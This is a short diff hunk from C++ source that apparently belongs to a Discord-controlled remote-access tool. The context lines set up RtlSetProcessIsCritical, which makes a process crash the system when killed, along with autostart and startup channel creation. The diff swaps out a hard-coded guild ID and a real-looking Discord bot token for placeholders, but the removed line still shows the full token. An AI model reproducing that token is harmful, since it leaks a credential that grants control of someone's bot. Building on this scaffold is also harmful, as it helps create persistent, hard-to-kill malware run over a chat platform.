@@ -26,8 +26,8 @@ typedef NTSTATUS(WINAPI* RtlSetProcessIsCritical)(BOOLEAN NewValue, BOOLEAN* Old
 std::filesystem::path temp = std::filesystem::temp_directory_path();
 
 //shit to change
-const long long int guildId = 1254187382140305408;
-const std::string BOT_TOKEN = "MTI1NDE4NzU1OTQyNTQwOTEwNQ.Gm132A.xjuAMEV_NTmhvMymh5hr5ijKZ5R1kOwGixyH7I";  // please dont fuck my shit up :( ima change this before it i release or not idk if ill remember
+const long long int guildId = 217934877984371974987; // replace with guild id NO QUOTATION MARKS
+const std::string BOT_TOKEN = "Token-here";  // please dont fuck my shit up :( ima change this before it i release or not idk if ill remember
 const bool autostart = false;
 
 // creates channel at startup and defines functions
